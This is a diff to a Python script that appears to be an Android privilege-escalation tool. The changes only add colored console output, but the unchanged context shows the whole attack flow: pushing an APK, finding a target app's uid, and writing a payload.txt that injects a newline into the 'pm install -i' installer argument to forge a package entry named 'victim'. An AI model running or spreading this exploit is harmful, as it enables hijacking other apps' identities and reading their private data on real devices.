@@ -1,6 +1,13 @@
 import argparse
 import subprocess, os
 
+
+GREEN = "\033[32m"
+CYAN = "\033[36m"
+BOLD = "\033[1m"
+RESET = "\033[0m"
+CHECK_MARK = "\u2714"
+
 class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter):
     pass
 
@@ -52,7 +59,7 @@ def push_apk(apk_path):
             print(f"Error: {result.stderr.strip()}")
             return False
 
-        print(f"Successfully pushed '{apk_path}' to /data/local/tmp/")
+        print(f"{CYAN}{BOLD}[{CHECK_MARK}] Successfully pushed '{GREEN}{apk_path}{CYAN}' to '{GREEN}/data/local/tmp/{os.path.basename(apk_path)}{CYAN}'")
         return True
     except Exception as e:
         print(f"An error occurred: {e}")
@@ -69,6 +76,7 @@ def get_app_uid(package_name):
         for line in result.stdout.splitlines():
             if f'package:{package_name} uid:' in line:
                 uid = line.split('uid:')[1].strip()
+                print(f"{CYAN}{BOLD}[{CHECK_MARK}] Got the target uid for {GREEN}{package_name}{CYAN} : {GREEN}{uid}{CYAN}")
                 return uid
         return None
     except Exception as e:
@@ -80,7 +88,7 @@ def generate_payload(uid, apk_filename):
         payload = f"PAYLOAD=\"@null\nvictim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null\"\npm install -i \"$PAYLOAD\" /data/local/tmp/{apk_filename}"
         with open('payload.txt', 'w') as f:
             f.write(payload)
-        print(f"Payload generated and saved to 'payload.txt'")
+        print(f"{CYAN}{BOLD}[{CHECK_MARK}] Payload generated and saved to : {GREEN}'payload.txt'{CYAN}")
     except Exception as e:
         print(f"An error occurred: {e}")
         
